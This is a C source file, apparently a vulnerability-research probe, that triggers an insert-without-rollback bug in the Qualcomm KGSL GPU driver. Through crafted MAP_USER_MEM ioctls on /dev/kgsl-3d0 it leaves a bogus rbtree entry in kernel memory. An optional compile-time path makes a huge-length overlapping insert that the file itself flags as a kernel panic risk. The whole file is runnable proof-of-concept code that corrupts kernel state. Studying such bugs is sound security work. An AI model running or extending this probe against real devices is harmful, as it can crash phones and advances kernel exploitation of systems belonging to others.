/*
 * kgsl_t5_rbtree.c - T5: SAFE probes around the insert-without-rollback bug
 * (kgsl_setup_anon_useraddr inserts the SVM range, then returns an error after
 * get_user_pages/memdesc_sg_virt fails -> bogus rbtree entry persists).
 *
 * Steps (safe subset):
 *   1. anon page(s) fixed at 0x700100000 (SVM64 range)
 *   2. map_usermem(0x700100000, 0x2000)  -> legit victim A (PTEs installed)
 *   3. map_usermem(0xFFFFFFFFFFFFF000, 0x2000) -> BOGUS wrapped insert; then
 *      get_user_pages fails -> expect -EFAULT, entry persists (no rollback)
 *   4. control probe: map_usermem overlapping A -> should still be rejected
 *
 * argv "t6": additionally attempt the huge-len bogus insert that OVERLAPS A
 *   mathematically (len=0x700102000).  Expected: set_svm_region inserts, then
 *   kgsl_malloc(vmalloc 2^55) -> NULL -> -ENOMEM.  PANIC RISK: only run with
 *   the user aware; never run hint-less mmap afterwards.
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_t5_rbtree kgsl_t5_rbtree.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_map_user_mem{int fd;u32 pad;u64 gpuaddr;u64 len;u64 offset;u64 hostptr;u32 memtype;u32 flags;};
#define IOCTL_MAP_USER_MEM IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x15,sizeof(struct kgsl_map_user_mem))
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ull
#define KGSL_USER_MEM_TYPE_ADDR 2
#define A_ADDR 0x700100000ull
#define WRAP_ADDR 0xFFFFFFFFFFFFF000ull
static long map_usermem(long fd, u64 hostptr, u64 len){
    struct kgsl_map_user_mem m;
    for(u64 i=0;i<sizeof(m);i++)((u8*)&m)[i]=0;
    m.fd=-1; m.len=len; m.hostptr=hostptr;
    m.memtype=KGSL_USER_MEM_TYPE_ADDR; m.flags=(u32)KGSL_MEMFLAGS_USE_CPU_MAP;
    return sys3(SYS_ioctl, fd, IOCTL_MAP_USER_MEM, (s64)&m);
}
void _start(void){
    long fd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    out("[*] open = ");outdec(fd);out("\n");
    if(fd<0){sys3(SYS_exit,1,0,0);return;}

    s64 a=sys6(SYS_mmap,A_ADDR,0x2000,3,0x32,-1,0);   /* MAP_PRIVATE|ANON|FIXED */
    out("[1] anon mmap @0x700100000 = ");outhex((u64)a);out("\n");
    if(a!= (s64)A_ADDR){ out("[!] fixed mmap failed\n"); }

    long r=map_usermem(fd,A_ADDR,0x2000);
    out("[2] victim A map_usermem -> ");outdec(r);
    if(r==0) out("  (A registered + PTEs)"); out("\n");

    r=map_usermem(fd,WRAP_ADDR,0x2000);
    out("[3] bogus wrapped insert -> ");outdec(r);
    if(r==-14) out("  (-EFAULT after rbtree insert; no rollback)");
    out("\n");

    r=map_usermem(fd,A_ADDR,0x1000);
    out("[4] control overlap probe -> ");outdec(r);
    if(r!=0) out("  (overlap still rejected = expected)"); out("\n");

#ifdef DO_T6
    out("[T6] huge-len overlap insert (PANIC RISK)\n");
    r=map_usermem(fd,WRAP_ADDR,0x700102000ull);
    out("[T6] ret -> ");outdec(r);out("\n");
#endif

    out("[*] done; closing fd (pagetable teardown)\n");
    sys3(SYS_close,fd,0,0);
    sys3(SYS_exit,0,0,0);
}
